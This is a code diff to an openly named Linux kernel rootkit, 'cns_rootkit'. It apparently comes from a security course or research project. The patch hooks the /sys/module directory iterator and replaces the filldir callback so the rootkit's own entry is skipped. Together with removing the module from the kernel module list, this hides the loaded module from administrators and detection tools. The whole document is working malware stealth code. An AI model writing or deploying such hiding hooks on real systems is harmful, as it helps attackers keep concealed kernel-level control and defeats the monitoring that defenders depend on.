@@ -151,6 +151,26 @@ int unestablish_comm_channel(void) {
   return 0;
 }
 
+int (*old_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned);
+
+int cns_rootkit_sys_module_filldir(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type) {
+  if(strncmp(name, "cns_rootkit", namelen) == 0) {
+    return 0;
+  } else {
+    return old_filldir(ctx, name, namelen, offset, ino, d_type);
+  }
+}
+
+int cns_rootkit_sys_module_iterate(struct file *filep, struct dir_context *ctx) {
+  old_filldir = ctx->actor;
+  ctx->actor = cns_rootkit_sys_module_filldir;
+  int (*old_iterate)(struct file *, struct dir_context *);
+  old_iterate = hook_unpatch(cns_rootkit_sys_module_iterate);
+  int res = old_iterate(filep, ctx);
+  hook_patch(cns_rootkit_sys_module_iterate);
+  return res;
+}
+
 struct list_head *module_list;
 int is_hidden = 0;
 
@@ -164,6 +184,11 @@ void cns_rootkit_hide(void)
 
     list_del(&THIS_MODULE->list);
 
+    struct file_operations *sys_module_fop = get_fops("/sys/module");
+
+    hook_add((void **)(&(sys_module_fop->iterate)), (void *)cns_rootkit_sys_module_iterate);
+    hook_patch((void *) cns_rootkit_sys_module_iterate);
+
     is_hidden = 1;
 }
 
@@ -175,6 +200,8 @@ void cns_rootkit_unhide(void)
     }
 
     list_add(&THIS_MODULE->list, module_list);
+
+    hook_remove((void *) cns_rootkit_sys_module_iterate);
 
     is_hidden = 0;
 }
